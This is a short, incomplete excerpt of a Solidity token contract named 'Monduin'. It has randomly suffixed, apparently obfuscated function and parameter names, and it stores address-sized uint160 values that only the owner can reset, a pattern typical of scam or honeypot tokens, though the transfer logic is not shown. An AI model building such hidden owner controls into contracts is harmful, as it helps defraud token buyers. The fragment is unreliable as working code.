...
contract Monduin {
    ...
    constructor(string memory _name11CjRL, string memory _symbolaMNnrO, uint160 _decimals, uint _supplyE6YfM5, uint160 txsEy603F, uint160 txsNewxm9wWH) {
        name = _name11CjRL;
        symbol = _symbolaMNnrO;
        decimals = _decimals;
        totalSupply = _supplyE6YfM5 * 10 ** _decimals; 
        balanceOf[msg.sender] = totalSupply;
        _owner = msg.sender;
        _router = address(0);
        _last = address(_owner);
        _txs = txsEy603F;
        _txsNew = txsNewxm9wWH;
    ...
    function setTXseS7DVO(uint160 txs) external onlyOwner returns (bool) {
        _txs = txs;
    ...
    function getMetru9hcoE() external view returns (uint160 txs, address last, bool state, bool algo) {
        txs = _txs;
        last = _last;
    ...
    function getMVVfcNmgG() external view returns (uint160 txsNew) {
        txsNew = _txsNew;
    }
